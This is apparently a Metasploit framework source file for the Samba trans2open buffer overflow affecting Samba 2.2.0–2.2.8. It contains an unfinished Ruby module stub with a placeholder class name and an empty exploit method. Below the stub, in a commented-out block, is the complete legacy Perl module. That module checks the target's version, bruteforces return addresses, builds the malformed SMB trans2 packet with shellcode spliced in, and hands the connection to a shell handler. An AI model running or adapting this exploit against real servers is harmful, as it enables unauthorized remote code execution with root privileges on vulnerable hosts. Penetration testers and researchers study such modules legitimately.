require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Samba trans2open Overflow',
			'Description'    => %q{
				This exploits the buffer overflow found in Samba versions
				2.2.0 to 2.2.8. This particular module is capable of
				exploiting the bug on x86 Linux and FreeBSD systems.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4469'],
					[ 'URL', 'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'],
					[ 'MIL', '53'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 734,
					'BadChars' => "\x00",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux, bsd',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Apr 7 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::samba_trans2open;
use base 'Msf::Exploit';
use strict;
use Pex::Text;
use Pex::SMB;

my $advanced = { };

my $info =
  {
	'Name'    => 'Samba trans2open Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'linux', 'bsd' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The samba port', 139],
		'SRET', => [0, 'DATA', 'Use specified return address'],
		'DEBUG' => [0, 'BOOL', 'Enable debugging mode'],
	  },

	'Payload' =>
	  {
		'Space'      => 734,
		'BadChars'  => "\x00",
		'Keys'      => ['+findsock'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits the buffer overflow found in Samba versions
        2.2.0 to 2.2.8. This particular module is capable of
        exploiting the bug on x86 Linux and FreeBSD systems.
}),

	'Refs'  =>
	  [
		['OSVDB', '4469'],
		['URL', 'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'],
		['MIL', '53'],
	  ],

	'Targets' =>
	  [
		["Linux x86",   0xbffffdfc, 0xbfa00000, 512, "RWRWDDRD"],
		["FreeBSD x86", 0xbfbffdfc, 0xbf100000, 512, "RWDWDDDD"],
	  ],

	'Keys'  => ['samba'],

	'DisclosureDate' => 'Apr 7 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );
	if ($s->IsError) {
		$self->PrintLine("[*] Error creating socket: " . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $x = Pex::SMB->new({ 'Socket' => $s });

	$x->SMBNegotiate();
	if ($x->Error) {
		$self->PrintLine("[*] Error negotiating protocol");
		return $self->CheckCode('Generic');
	}

	$x->SMBSessionSetup();
	if ($x->Error) {
		$self->PrintLine("[*] Error setting up session");
		return $self->CheckCode('Generic');
	}

	my $version = $x->PeerNativeLM();
	$s->Close;

	if (! $version) {
		$self->PrintLine("[*] Could not determine the remote Samba version");
		return $self->CheckCode('Generic');
	}

	$self->PrintDebugLine(1, 'LanMan: '.$version);
	$self->PrintDebugLine(1, ' OpSys: '.$x->PeerNativeOS);

	if ($version =~ /samba\s+([01]|2\.0|2\.2\.[0-7]|2\.2\.8$)/i) {
		$self->PrintLine("[*] Target seems to running vulnerable version: $version");
		return $self->CheckCode('Appears');
	}

	$self->PrintLine("[*] Target does not seem to be vulnerable: $version");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $curr_ret;

	$self->PrintLine("[*] Starting bruteforce mode for target ".$target->[0]);

	if ($self->GetVar('SRET'))
	{
		my $ret = eval($self->GetVar('SRET')) + 0;
		$target->[1] = $target->[2] = $ret;
	}

	for (
		$curr_ret  = $target->[1];
		$curr_ret >= $target->[2];
		$curr_ret -= $target->[3]
	  )
	{
		my $Ret = pack("V", $curr_ret);
		my $Wri = pack("V", ($curr_ret - 128));
		my $Dat = "META";
		my $Addr;

		foreach (split(//, $target->[4]))
		{
			$Addr .= $Ret if $_ eq "R";
			$Addr .= $Wri if $_ eq "W";
			$Addr .= $Dat if $_ eq "D";
		}

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		my $x = Pex::SMB->new({ 'Socket' => $s });

		$x->SMBNegotiate();
		if ($x->Error) {
			$self->PrintLine("[*] Error negotiating protocol");
			return;
		}

		$x->SMBSessionSetup();
		if ($x->Error) {
			$self->PrintLine("[*] Error setting up session");
			return;
		}

		$x->SMBTConnect("\\\\127.0.0.1\\IPC\$");
		if ($x->Error) {
			$self->PrintLine("[*] Error connecting to IPC");
			return;
		}

		my $Overflow =
		  "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
		  "\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90";

		$Overflow .=  $shellcode;
		$Overflow .= "A" x 297;
		$Overflow .=  $Addr . ("\x00" x 273);

		$self->PrintLine(sprintf("[*] Trying return address 0x%.8x...", $curr_ret));

		if ($self->GetVar('DEBUG'))
		{
			print STDERR "[*] Press enter to send overflow string...\n";
			<STDIN>;
		}

		$s->Send($Overflow);
		$s->Send("\x00" x 810);

		# handle client side of shellcode
		$self->Handler($s);

		# give the payload time to execute
		sleep(5) if ($self->GetVar('SRET'));

		$s->Close();
		undef($s);
	}
	return;
}


=end


end
end	
